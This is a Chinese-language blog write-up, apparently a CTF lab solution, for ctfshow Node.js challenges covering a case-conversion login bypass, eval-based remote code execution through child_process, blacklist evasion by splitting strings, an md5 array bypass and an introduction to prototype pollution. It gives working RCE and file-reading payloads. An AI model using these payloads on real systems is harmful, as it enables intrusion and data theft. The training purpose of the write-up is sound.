@@ -1,0 +1,1868 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>ctfshow-nodejs - TARI TARI</title>
+  
+    <meta name="keywords" content="ctf,ctfshow,ctf练习">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        ctfshow-nodejs
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年5月4日 21:50</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-04T23:30:32+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年5月4日 23:30</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="ctfshow-nodejs" data-path="/2021/05/04/ctfshow-nodejs/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：6.2k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：28分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <meta name="referrer" content="no-referrer" />
+
+<p>web342 很刺激 （</p>
+<p>感觉对原型链污染理解又加深了呢~</p>
+<h2 id="web334-JS-大小写特性"><a href="#web334-JS-大小写特性" class="headerlink" title="web334 JS 大小写特性"></a>web334 JS 大小写特性</h2><p>搜集了半天信息，发现题目描述处有源码可以直接下载。。</p>
+<p>user.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  items: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>login.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).items;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="function"><span class="keyword">function</span>(<span class="params">name, password</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> users.find(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">var</span> user = findUser(req.body.username, req.body.password);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.session.regenerate(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.session.loginUser = user.username;</span><br><span class="line">      res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>即满足</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br></pre></td></tr></table></figure>
+
+<p>我们输入的 <code>name</code> 不为 <code>CTFSHOW</code> 然后 <code>name</code> 转换后的大写为 <code>CTFSHOW</code> ，密码为 <code>123456</code> 即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>网上看了一下，其实想要的考点是</p>
+<p><code>toUpperCase()</code> 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。</p>
+<p><code>toLowerCase()</code> 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。</p>
+<p>可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>这样的应该是，比如字符 <code>s</code> 或 <code>S</code> 不能出现在输入字符中就好了。</p>
+<h2 id="web335-RCE"><a href="#web335-RCE" class="headerlink" title="web335 RCE"></a>web335 RCE</h2><p>f12 源码提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>即简单命令执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?eval&#x3D;require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<h2 id="web336-RCE-黑名单绕过"><a href="#web336-RCE-黑名单绕过" class="headerlink" title="web336 RCE 黑名单绕过"></a>web336 RCE 黑名单绕过</h2><p>f12 源码提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>即简单命令执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取 flag</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>emm 好像就 flag 文件换了个名字？</p>
+<p>顺便收集多几个命令执行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).stdout.toString()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>).toString()</span><br><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).toString()</span><br></pre></td></tr></table></figure>
+
+<p>收集过程中发现，原来第 2、3 个 被禁了，2333 原来考察黑名单</p>
+<p>先通过全局变量读取当前目录位置</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>当前目录</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__dirname</span><br></pre></td></tr></table></figure>
+
+
+
+<p>读文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>发现过滤了exec和load</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>绕过方法</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>require(&#39;child_process&#39;)</code>  方法返回一个对象，可以通过类型 Python数组的方式去访问里面的成员。</p>
+<p>或者用其他模块读文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当然还有其他姿势，比如变量拼接在执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web337-md5绕过"><a href="#web337-md5绕过" class="headerlink" title="web337 md5绕过"></a>web337 md5绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>和 PHP 一样，数组绕过即可</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a[]=1&amp;b=1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现这样更易于理解</p>
+<p>payload: <code>a[x]=1&amp;b[x]=2</code></p>
+<p>运行一下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<h2 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338 原型链污染"></a>web338 原型链污染</h2><p>题目描述处蓝奏云下载源码</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619675230760-b6f83557-6f65-4002-a134-8d2c0eeca5bb.zip">📎web338.zip</a></p>
+<p>先看看这篇文章了解一波什么是 JS 的原型链污染</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
+<p>关键代码</p>
+<p>utils/common.js</p>
